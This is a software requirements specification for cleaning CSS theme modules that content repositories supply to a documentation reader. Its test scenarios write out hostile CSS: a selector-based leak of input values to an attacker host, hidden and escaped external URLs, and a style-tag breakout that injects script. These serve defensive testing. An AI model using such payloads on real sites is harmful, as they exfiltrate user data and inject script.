## ADDED Requirements

### Requirement: Style modules of a content repository

A content repository MAY hold an `estilos/` folder at its root with CSS files that restyle the reader on its own pages. Each file SHALL be named after one of the platform's style modules, and SHALL be read in this order:

1. `tema.css`: the theme tokens (the variables of `:root` and `.dark`).
2. `pagina.css`: the page body (headings, links, bold, inline code, anchors, icons).
3. `controles.css`: the page's icon-only controls and their hint bubble.
4. `codigo.css`: code blocks.
5. `tablas.css`: catalog tables, page tables and interactive tables.
6. `diagramas.css`: diagrams and their pointer card.
7. `imagenes.css`: the page's images and the viewer.
8. `avisos.css`: callouts and quotes.
9. `secciones.css`: the repeated sections of a page.

Every module SHALL be optional, and a repository without `estilos/` SHALL be valid with no problem reported. Any other entry under `estilos/` (another file name, a subfolder) SHALL be reported naming the modules that exist, and SHALL be ignored. The modules SHALL be joined in that order into one stylesheet for the repository, so that a later module wins over an earlier one where their rules meet.

#### Scenario: Only a theme

- **WHEN** a repository holds `estilos/tema.css` and no other style file
- **THEN** its stylesheet SHALL be the cleaned `tema.css` and no problem SHALL be reported about the missing modules

#### Scenario: Unknown module name

- **WHEN** a repository holds `estilos/tables.css`
- **THEN** `estilos/tables.css` SHALL be reported as not being a style module, the message SHALL list the module names, and the file SHALL NOT be part of the stylesheet

#### Scenario: No styles folder

- **WHEN** a repository has no `estilos/` folder
- **THEN** its stylesheet SHALL be empty and no problem SHALL be reported

### Requirement: Style modules are cleaned before use

A module SHALL be parsed as CSS and only what the platform allows SHALL reach the stylesheet:

- At-rules: only `@media`, `@supports`, `@container`, `@layer`, `@keyframes`, `@font-face`, `@property`, `@scope` and `@starting-style`. Any other at-rule, `@import` included, SHALL be removed.
- Resources: every `url()`, and every string that a function such as `image-set()` or `src()` takes as a resource, SHALL be either a `data:` URI of an image or font media type, or a relative path that, resolved from the module's folder, names an existing image file under the repository's `docs/`. Such a path SHALL be rewritten to the reader's route for that image. Any other resource (an absolute or protocol-relative URL, another scheme, a path outside `docs/`, a missing file or a file that is not an image) SHALL remove the declaration that holds it.
- Custom property values SHALL be checked like any other value.
- At-rule, function and property names SHALL be compared as the browser reads them, with CSS escapes decoded (`u\72l(` is `url(`).
- The properties `behavior` and `-moz-binding` SHALL be removed.
- The stylesheet SHALL NOT contain the character `<`: every `<` SHALL be written as the CSS escape `\3c `.
- Comments SHALL NOT be kept.
- A part the platform cannot parse SHALL be removed: the rule, at-rule or declaration that holds it, or the unreadable fragment itself.

Each removal SHALL be reported with the module's path, the line and a message in Spanish naming what was removed. The rest of the module, and every other module, SHALL still be used.

#### Scenario: External font

- **WHEN** `estilos/tema.css` holds `@import url("https://fonts.example.com/inter.css");` and `:root { --primary: oklch(0.6 0.2 250); }`
- **THEN** the `@import` SHALL be removed and reported on `estilos/tema.css` with its line, and the stylesheet SHALL keep the `--primary` declaration

#### Scenario: Background from the repository's images

- **WHEN** `estilos/pagina.css` sets `background-image: url(../docs/img/fondo.png)` and `docs/img/fondo.png` exists
- **THEN** the stylesheet SHALL hold the declaration with the URL rewritten to the reader's route for `img/fondo.png`

#### Scenario: Leaking a value through a selector

- **WHEN** `estilos/tablas.css` holds `input[value^="a"] { background: url(https://evil.example/a) }`
- **THEN** the declaration SHALL be removed and reported, and no request to `evil.example` SHALL be possible from the stylesheet

#### Scenario: Hidden URL in a custom property

- **WHEN** a module sets `--fondo: url(//evil.example/x.png)`
- **THEN** the declaration SHALL be removed and reported

#### Scenario: Breaking out of the style element

- **WHEN** a module sets `content: "</style><script>alert(1)</script>"`
- **THEN** the stylesheet SHALL hold the string with every `<` written as `\3c ` and SHALL NOT contain `<`

#### Scenario: Escaped function name

- **WHEN** a module sets `background: u\72l("https://evil.example/x.png")`
- **THEN** the declaration SHALL be removed and reported as an external resource

#### Scenario: Unreadable part of a module

- **WHEN** `estilos/avisos.css` holds a valid rule and, on line 2, a fragment the platform cannot parse
- **THEN** the fragment SHALL be removed and reported on line 2, and the valid rule and the other modules SHALL still form the stylesheet

### Requirement: Size limits of the style modules

A module larger than 64 KiB SHALL be left out whole and reported. Modules SHALL be added to the stylesheet in order while the cleaned stylesheet stays within 128 KiB. A module that would take it over SHALL be left out and reported, and so SHALL every module after it.

#### Scenario: A module too large

- **WHEN** `estilos/diagramas.css` is 80 KiB
- **THEN** it SHALL be reported as too large and left out, and the other modules SHALL be used

### Requirement: Style problems are site problems

The problems of `estilos/` SHALL be reported like the site's other problems (`menu.yaml`, reserved files): on the repository's home, each with the module's path relative to the content root, its line when there is one and a message in Spanish. They SHALL be logged once per distinct set per repository and commit. Problems in the styles SHALL NOT stop any page from being listed or rendered.

#### Scenario: Admin opens the home

- **WHEN** an admin opens the home of a repository whose `estilos/codigo.css` holds an `@import`
- **THEN** the home's problems SHALL list the removed `@import` on `estilos/codigo.css` with its line

### Requirement: Styles follow the clone

A repository's stylesheet SHALL be read and cleaned with its pages, once per checkout. After a sync that changes the clone, the next read SHALL use the new modules. A repository whose sync fails SHALL keep the stylesheet of its last checkout.

#### Scenario: A push changes the theme

- **WHEN** a writer pushes a new `estilos/tema.css` and the push sync finishes
- **THEN** the next page read of that repository SHALL carry the new stylesheet
